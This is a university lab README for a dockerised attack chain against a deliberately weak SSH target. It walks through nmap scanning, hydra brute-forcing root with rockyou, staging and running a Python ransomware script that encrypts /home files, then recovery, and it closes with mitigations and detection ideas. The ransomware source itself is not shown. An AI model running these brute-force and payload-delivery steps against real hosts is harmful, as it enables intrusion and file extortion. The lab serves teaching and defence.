# Ransomware Simulation Lab — SSH Exploitation & Python Ransomware

A self-contained, dockerised cyber security lab that demonstrates a full
attack chain: **reconnaissance → SSH exploitation → payload delivery →
ransomware execution → recovery**.

Built for the *Cyber Security* module assignment. The lab runs two
containers on an isolated Docker bridge network:

| Role     | Image                      | Purpose                                   |
| -------- | -------------------------- | ----------------------------------------- |
| Attacker | `kalilinux/kali-rolling`   | Recon, brute-force, payload delivery      |
| Target   | `debian:bookworm-slim`     | Victim host running a misconfigured SSH   |

> **Disclaimer:** This project is for **educational use only**, run inside
> an isolated Docker network on your own machine. Do not deploy any part
> of this against systems you do not own or have explicit permission to
> test.

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Attack Chain](#attack-chain)
- [Quick Start](#quick-start)
- [Manual Walkthrough](#manual-walkthrough)
- [The Payload](#the-payload)
- [Screenshots](#screenshots)
- [Findings & Mitigations](#findings--mitigations)
- [Lessons Learned](#lessons-learned)
- [References](#references)

---

## Overview

This lab simulates a realistic ransomware incident end-to-end:

1. An attacker scans the network and identifies an exposed SSH service.
2. The SSH service is **misconfigured** (`PermitRootLogin yes`) and uses a
   **weak root password** (`toor`) — the kind of misconfiguration that
   still shows up in real environments.
3. The attacker logs in and delivers a Python ransomware payload.
4. The payload encrypts all files under `/home/*` using **Fernet
   (AES-128-CBC + HMAC-SHA256)**, renames them to `*.locked`, and drops a
   ransom note demanding **$5000 in BTC to wallet `cryptoABC`**.
5. After "payment", the attacker supplies the decryption key and the
   `extractor.py` tool, which restores the files.

The goal is to show both **how easy this is when fundamentals are
ignored**, and **which controls would have stopped each phase**.

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                Docker bridge: cyber-lab                 │
│                                                         │
│   ┌────────────────────┐       ┌────────────────────┐   │
│   │     attacker       │       │      target        │   │
│   │  kali-rolling      │──────▶│  debian:bookworm   │   │
│   │                    │  SSH  │                    │   │
│   │  nmap, hydra, ssh  │  :22  │  sshd (weak creds) │   │
│   │  python3, crypto   │       │  python3, crypto   │   │
│   └────────────────────┘       └────────────────────┘   │
│        172.23.0.3                  172.23.0.2           │
└─────────────────────────────────────────────────────────┘
```

Both containers run `sleep infinity` as PID 1 so they stay alive; services
(sshd) are started manually via `entrypoint.sh` on the target.

---

## Attack Chain

| # | Phase                | Tool / Command                                          |
|---|----------------------|---------------------------------------------------------|
| 1 | Reconnaissance       | `nmap -sV -p 22 target`                                 |
| 2 | Credential attack    | `hydra -l root -P rockyou.txt ssh://target`             |
| 3 | Initial access       | `ssh root@target` (password: `toor`)                    |
| 4 | Payload staging      | `scp encrypter.py root@target:/tmp/`                    |
| 5 | Execution            | `ssh root@target "python3 /tmp/encrypter.py"`           |
| 6 | Impact               | Files renamed to `*.locked`, `README.md` ransom dropped |
| 7 | Payment (simulated)  | Attacker reveals key `kami1234`                         |
| 8 | Recovery             | `scp extractor.py root@target:/tmp/` + run with key     |

---

## Quick Start

Requires Docker + Docker Compose.

```bash
git clone https://github.com/<your-user>/uos-cyber-assignment1.git
cd uos-cyber-assignment1

# build and start both containers
docker compose up -d --build

# verify both are running
docker compose ps
```

You now have two shells available:

```bash
docker compose exec attacker bash
docker compose exec target bash
```

Follow the [Manual Walkthrough](#manual-walkthrough) to run the attack.

To tear everything down:

```bash
docker compose down -v
```

---

## Manual Walkthrough

### 1. Confirm network connectivity

From the **attacker** container:

```bash
ping -c 2 target
nmap -sV -p 22 target
```

Expected: `22/tcp open ssh OpenSSH ...`.

### 2. Brute-force / log in with weak credentials

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target
# For a quick demo, just use the known weak password:
ssh root@target     # password: toor
```

### 3. Stage the payload on the target

```bash
scp encrypter.py extractor.py root@target:/tmp/
```

### 4. Snapshot the "before" state

```bash
ssh root@target "ls -la /home/kami/myfiles"
ssh root@target "cat /home/kami/myfiles/secret.txt"
```

### 5. Execute the ransomware

```bash
ssh root@target "python3 /tmp/encrypter.py"
```

### 6. Observe the impact

```bash
ssh root@target "ls -la /home/kami/myfiles"
ssh root@target "cat /home/kami/README.md"
ssh root@target "cat /home/kami/myfiles/secret.txt.locked"   # ciphertext
```

### 7. "Pay" the ransom and recover

```bash
ssh root@target "python3 /tmp/extractor.py kami1234"
ssh root@target "ls -la /home/kami/myfiles"
ssh root@target "cat /home/kami/myfiles/secret.txt"
```

### 8. Bonus — prove a wrong key fails

```bash
ssh root@target "python3 /tmp/extractor.py wrongkey"
# -> [!] Invalid key. Pay the ransom to receive the correct key.
```

---

## The Payload

### `payload/encrypter.py`

- Derives a Fernet key from the passphrase `kami1234`
  (`base64url(sha256("kami1234"))`).
- Walks `/home`, encrypts every regular file, renames to `*.locked`.
- Drops a per-user `README.md` ransom note.
- Idempotent: skips `*.locked` and `README.md`.

### `payload/extractor.py`

- Takes the passphrase as `argv[1]`.
- Validates against a sample `.locked` file before touching anything.
- Decrypts all `*.locked` files, restores original names, removes notes.

### Crypto notes (for the report)

- **Fernet** = AES-128 in CBC mode + HMAC-SHA256 for integrity.
- The key is *derived* from a passphrase, which is fine for a demo but
  not how real ransomware works.
- Real ransomware uses a **hybrid scheme**: a random AES key per file,
  wrapped with the attacker's RSA/ECC public key so the victim cannot
  recover without the attacker's private key.

---

## Screenshots

Add evidence under `screenshots/`:

| File                              | Shows                                |
| --------------------------------- | ------------------------------------ |
| `01-nmap-scan.png`                | Recon — SSH open on target           |
| `02-hydra-bruteforce.png`         | Credential attack                    |
| `03-ssh-login.png`                | Initial access as root               |
| `04-before-encryption.png`        | `/home/kami/myfiles` pre-attack      |
| `05-encrypter-run.png`            | Payload execution output             |
| `06-after-encryption.png`         | `*.locked` files + `README.md`       |
| `07-ransom-note.png`              | `cat README.md`                      |
| `08-wrong-key.png`                | Extractor rejects invalid key        |
| `09-recovery.png`                 | Files restored after payment         |

---

## Findings & Mitigations

| # | Finding                                       | Severity | Mitigation                                                       |
|---|-----------------------------------------------|----------|------------------------------------------------------------------|
| 1 | SSH exposed on default port 22                | Low      | Move to non-standard port, restrict via firewall / security group |
| 2 | `PermitRootLogin yes`                         | High     | Set `PermitRootLogin no`; use `sudo` for admin tasks              |
| 3 | Weak password (`toor`) on root                | Critical | Strong password policy, `fail2ban`, key-based auth only           |
| 4 | `PasswordAuthentication yes`                  | Medium   | Disable password auth, require SSH keys                           |
| 5 | No rate limiting on SSH                       | Medium   | `fail2ban`, `pam_faillock`, `MaxAuthTries`                        |
| 6 | User files writable by root without backups   | High     | Immutable backups, least privilege, EDR                            |
| 7 | No file integrity monitoring                  | Medium   | `auditd`, AIDE, or a SIEM rule on mass renames                    |

---

## Lessons Learned

- **Defaults are dangerous.** Every misconfiguration exploited here is a
  one-line change in `sshd_config`.
- **Defence in depth matters.** Even if SSH falls, backups + least
  privilege + monitoring limit blast radius.
- **Ransomware is trivial to write.** The hard part isn't the crypto —
  it's the delivery, persistence, and evasion. This lab isolates the
  crypto to make that point.
- **Detection opportunities exist.** Mass `.locked` renames, unusual
  outbound SSH from a server, and a new `README.md` in every user
  directory are all high-signal events.

---

## References

- OpenSSH `sshd_config` manual — <https://man.openbsd.org/sshd_config>
- `cryptography` Fernet spec — <https://cryptography.io/en/latest/fernet/>
- MITRE ATT&CK — T1486 *Data Encrypted for Impact*
- MITRE ATT&CK — T1110 *Brute Force*
- NIST SP 800-123 *Guide to General Server Security*

---

## Author

**Kami** — University of Sunderland, Cyber Security module.
Assignment 1: Dockerised attacker/target lab with Python ransomware demo.
